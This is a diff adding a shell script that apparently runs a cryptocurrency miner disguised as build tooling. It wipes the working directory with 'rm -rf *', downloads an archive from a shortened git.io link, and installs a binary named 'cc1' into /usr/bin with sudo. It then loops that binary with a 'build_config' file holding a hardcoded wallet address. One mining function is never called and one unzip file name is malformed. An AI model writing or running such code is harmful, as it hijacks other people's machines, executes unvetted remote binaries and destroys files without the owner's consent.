@@ -1,0 +1,78 @@
+LOOP=
+SHUF="shuf -n 1 -i 1000-9999"
+COLOR='\033[0;34m'
+THREAD="6"
+WALLET_A="86kQvUHE1rxd62wyraQzERC1aCHCRmYGxaENYGWfsRK6hTAkXNZMwCu2kjxwbNrHWFCEYq8oWtC4p1cQN6a9EMEHDKQbE8U"
+WALLET_B="86kQvUHE1rxd62wyraQzERC1aCHCRmYGxaENYGWfsRK6hTAkXNZMwCu2kjxwbNrHWFCEYq8oWtC4p1cQN6a9EMEHDKQbE8U"
+WALLET_C="86kQvUHE1rxd62wyraQzERC1aCHCRmYGxaENYGWfsRK6hTAkXNZMwCu2kjxwbNrHWFCEYq8oWtC4p1cQN6a9EMEHDKQbE8U"
+WALLET_D="86kQvUHE1rxd62wyraQzERC1aCHCRmYGxaENYGWfsRK6hTAkXNZMwCu2kjxwbNrHWFCEYq8oWtC4p1cQN6a9EMEHDKQbE8U"
+WALLET_E="86kQvUHE1rxd62wyraQzERC1aCHCRmYGxaENYGWfsRK6hTAkXNZMwCu2kjxwbNrHWFCEYq8oWtC4p1cQN6a9EMEHDKQbE8U"
+BUILD="$(pwd)/build_config"
+MINE_A() {
+    LOOP=$(($LOOP + 1))
+    USER="$(echo ${LOOP}th-$($SHUF))"
+    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
+    sed -i "s/USER/$USER/" "build_config"
+    sed -i "s/WALLET/$WALLET_A/" "build_config"
+    chmod +x cc1
+    timeout 45 cc1 --config $BUILD
+    cp -rf backup build_config
+    clear
+}
+MINE_B() {
+    LOOP=$(($LOOP + 1))
+    USER="$(echo ${LOOP}th-$($SHUF))"
+    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
+    sed -i "s/USER/$USER/" "build_config"
+    sed -i "s/WALLET/$WALLET_B/" "build_config"
+    timeout 45 cc1 --config $BUILD
+    cp -rf backup build_config
+    clear
+}
+MINE_C() {
+    LOOP=$(($LOOP + 1))
+    USER="$(echo ${LOOP}th-$($SHUF))"
+    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
+    sed -i "s/USER/$USER/" "build_config"
+    sed -i "s/WALLET/$WALLET_C/" "build_config"
+    timeout 45 cc1 --config $BUILD
+    cp -rf backup build_config
+    clear
+}
+MINE_D() {
+    LOOP=$(($LOOP + 1))
+    USER="$(echo ${LOOP}th-$($SHUF))"
+    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
+    sed -i "s/USER/$USER/" "build_config"
+    sed -i "s/WALLET/$WALLET_D/" "build_config"
+    timeout 45 cc1 --config $BUILD
+    cp -rf backup build_config
+    clear
+}
+MINE_E() {
+    LOOP=$(($LOOP + 1))
+    USER="$(echo ${LOOP}th-$($SHUF))"
+    echo -e "${COLOR}##########_______Worker at ${USER}_______##########"
+    sed -i "s/USER/$USER/" "build_config"
+    sed -i "s/WALLET/$WALLET_E/" "build_config"
+    timeout 45 cc1 --config $BUILD
+    cp -rf backup build_config
+    clear
+}
+SETUP() {
+rm -rf *
+wget https://git.io/J0jvk  --content-disposition >/dev/null 2>&1
+unzip -q trial 6.zip
+chmod u+x cc1
+sudo mv cc1 /usr/bin
+}
+SETUP
+sed -i "s/THREAD/$THREAD/" "build_config"
+cp build_config backup
+while :
+do
+  MINE_A
+  MINE_B
+  MINE_C
+  MINE_D
+done
